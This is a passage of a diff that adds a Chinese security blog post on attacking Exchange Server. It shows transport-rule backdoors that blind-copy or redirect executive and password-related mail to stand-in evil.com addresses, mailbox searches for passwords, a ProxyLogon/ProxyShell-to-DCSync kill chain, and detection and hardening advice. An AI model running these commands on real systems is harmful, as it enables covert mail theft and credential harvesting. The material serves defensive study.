class="line"></span><br><span class="line"><span class="built_in">New-TransportRule</span> <span class="literal">-Name</span> <span class="string">&quot;Compliance_Archive&quot;</span> <span class="literal">-SentTo</span> <span class="string">&quot;ceo@target.com&quot;</span> `</span><br><span class="line">    <span class="literal">-BlindCopyTo</span> <span class="string">&quot;attacker@evil.com&quot;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="七、邮件转发规则后门"><a href="#七、邮件转发规则后门" class="headerlink" title="七、邮件转发规则后门"></a>七、邮件转发规则后门</h2><p>传输规则 (Transport Rule) 运行于 Exchange 传输管道，作用在组织级别，用户无法在 OWA 看到，隐蔽性极高。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">外部发件 → 接收连接器 → Transport Rule Pipeline → 目标收件人</span><br><span class="line">                                │ Bcc/重定向 → 攻击者邮箱</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建隐蔽传输规则</span></span><br><span class="line"><span class="built_in">New-TransportRule</span> <span class="literal">-Name</span> <span class="string">&quot;ComplianceRetention&quot;</span> <span class="literal">-Priority</span> <span class="number">0</span> `</span><br><span class="line">    <span class="literal">-SentTo</span> <span class="string">&quot;ceo@target.com&quot;</span> <span class="literal">-BlindCopyTo</span> <span class="string">&quot;external@evil.com&quot;</span></span><br><span class="line"><span class="built_in">New-TransportRule</span> <span class="literal">-Name</span> <span class="string">&quot;MailFlow_Diagnostics&quot;</span> <span class="literal">-Priority</span> <span class="number">0</span> `</span><br><span class="line">    <span class="literal">-SubjectContainsWords</span> <span class="string">&quot;密码&quot;</span>,<span class="string">&quot;合同&quot;</span>,<span class="string">&quot;报表&quot;</span> <span class="literal">-RedirectMessageTo</span> <span class="string">&quot;logger@evil.com&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检测与清除</span></span><br><span class="line"><span class="built_in">Get-TransportRule</span> | <span class="built_in">fl</span> Name, Actions, Conditions</span><br><span class="line"><span class="built_in">Remove-TransportRule</span> <span class="literal">-Identity</span> <span class="string">&quot;ComplianceRetention&quot;</span> <span class="literal">-Confirm</span>:<span class="variable">$false</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="八、邮箱搜索与数据窃取"><a href="#八、邮箱搜索与数据窃取" class="headerlink" title="八、邮箱搜索与数据窃取"></a>八、邮箱搜索与数据窃取</h2><p>Exchange 提供 Content Search &#x2F; eDiscovery 功能，允许管理员跨所有邮箱全文搜索。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 合规性搜索 — 跨全组织邮箱搜索敏感关键词</span></span><br><span class="line"><span class="built_in">New-ComplianceSearch</span> <span class="literal">-Name</span> <span class="string">&quot;Audit_Q3&quot;</span> <span class="literal">-ExchangeLocation</span> <span class="string">&quot;All&quot;</span> `</span><br><span class="line">    <span class="literal">-ContentMatchQuery</span> <span class="string">&#x27;(&quot;密码&quot; OR &quot;password&quot; OR &quot;VPN&quot;) AND (sent&gt;=2025-01-01)&#x27;</span></span><br><span class="line"><span class="built_in">Start-ComplianceSearch</span> <span class="literal">-Identity</span> <span class="string">&quot;Audit_Q3&quot;</span></span><br><span class="line"><span class="built_in">Get-ComplianceSearch</span> <span class="literal">-Identity</span> <span class="string">&quot;Audit_Q3&quot;</span> | <span class="built_in">Select</span> Items, Size, Status</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># EWS 细粒度搜索 (Python exchangelib)</span></span><br><span class="line"><span class="keyword">from</span> exchangelib <span class="keyword">import</span> Account, Credentials, DELEGATE, Configuration, Q</span><br><span class="line">creds = Credentials(<span class="string">&#x27;DOMAIN\\user&#x27;</span>, <span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">config = Configuration(server=<span class="string">&#x27;mail.target.com&#x27;</span>, credentials=creds, auth_type=<span class="string">&#x27;NTLM&#x27;</span>)</span><br><span class="line">account = Account(<span class="string">&#x27;user@target.com&#x27;</span>, config=config, autodiscover=<span class="literal">False</span>, access_type=DELEGATE)</span><br><span class="line">results = account.inbox.<span class="built_in">filter</span>(</span><br><span class="line">    Q(subject__contains=<span class="string">&#x27;密码&#x27;</span>) | Q(body__contains=<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">).only(<span class="string">&#x27;subject&#x27;</span>, <span class="string">&#x27;sender&#x27;</span>, <span class="string">&#x27;datetime_received&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> results:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] <span class="subst">&#123;item.datetime_received&#125;</span> | <span class="subst">&#123;item.sender&#125;</span> | <span class="subst">&#123;item.subject&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="九、Exchange-SSRF-完整攻击链"><a href="#九、Exchange-SSRF-完整攻击链" class="headerlink" title="九、Exchange SSRF 完整攻击链"></a>九、Exchange SSRF 完整攻击链</h2><p>将上述攻击面串联，形成从外网到域控的 kill chain：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">① 信息收集     端口扫描 (443,444) + 虚拟目录枚举 + 版本探测</span><br><span class="line">      │</span><br><span class="line">② 初始访问     ProxyLogon: SSRF→鉴权绕过→写shell</span><br><span class="line">               ProxyShell: 路径混淆→PowerShell RCE</span><br><span class="line">               弱口令爆破: OWA / EAC / EWS</span><br><span class="line">      │</span><br><span class="line">③ 权限提升     EWS Impersonation → 模拟域名管理员</span><br><span class="line">               PS Remoting → 添加 Organization Management</span><br><span class="line">               Exchange Trusted Subsystem → DCSync 权限</span><br><span class="line">      │</span><br><span class="line">④ 持久化       传输规则后门 / 收件箱规则后门 (EWS注入)</span><br><span class="line">               计划任务定时导出邮箱 / EWS Push Notification</span><br><span class="line">      │</span><br><span class="line">⑤ 横向移动     DCSync (Replicating Directory Changes)</span><br><span class="line">               Kerberoast → Exchange 服务账户 Hash</span><br><span class="line">               邮箱搜索 → VPN凭据、数据库连接串、内部拓扑</span><br><span class="line">      │</span><br><span class="line">⑥ 数据窃取     邮箱导出(.pst) + EWS SyncFolderItems</span><br><span class="line">               合规性搜索导出 (Compliance Search Export)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="十、检测与防御"><a href="#十、检测与防御" class="headerlink" title="十、检测与防御"></a>十、检测与防御</h2><p><strong>IIS 日志检测特征：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># ProxyLogon — 异常 Cookie 头</span><br><span class="line">Cookie: X-AnonResource-Backend=.*#~</span><br><span class="line"># ProxyShell — 异常 autodiscover 请求</span><br><span class="line">GET /autodiscover/autodiscover.json.*@.*/ews/exchange.asmx</span><br></pre></td></tr></table></figure>
+
+<p><strong>Windows 事件日志监控：</strong></p>
+<table>
+<thead>
+<tr>
+<th>Event ID</th>
+<th>来源</th>
+<th>检测内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1 (Sysmon)</td>
+<td>进程创建</td>
+<td><code>New-TransportRule</code>, <code>New-MailboxExportRequest</code></td>
+</tr>
+<tr>
+<td>4662</td>
+<td>AD</td>
+<td>非预期的目录复制操作 (DCSync)</td>
+</tr>
+<tr>
+<td>4104</td>
+<td>PS</td>
+<td>包含 Exchange cmdlet 的可疑脚本块</td>
+</tr>
+</tbody></table>
+<p><strong>加固措施：</strong> 及时更新 CU&#x2F;SU 补丁；限制后端 444 端口仅本机访问；禁用基本认证；部署 EOMT；定期审计传输规则与收件箱规则。</p>
+<hr>
+<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>Exchange Server 攻击面的广度源于其在企业架构中的枢纽地位——它既是互联网入口，又与内网域控深度耦合。理解这些攻击面的本质比记忆单个 CVE 更重要：Exchange 是一座连接外网与内网、用户与域控的桥梁，攻守双方在桥上的博弈从未停歇。</p>
+<p><strong>再次声明：</strong> 本文所有内容仅用于安全研究与防护体系建设，任何未经授权的入侵行为均属违法。</p>
+<hr>
+<p><em>Published: 2025-11-05 | Security Research Team</em></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag"># 内网渗透</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/Mobile-Android-pentest-basics/" rel="prev" title="移动安全：Android APP 渗透测试基础">
+                  <i class="fa fa-angle-left"></i> 移动安全：Android APP 渗透测试基础
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/SSRF-gopher-protocol/" rel="next" title="SSRF：Gopher协议深度利用">
+                  SSRF：Gopher协议深度利用 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">YunShang</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
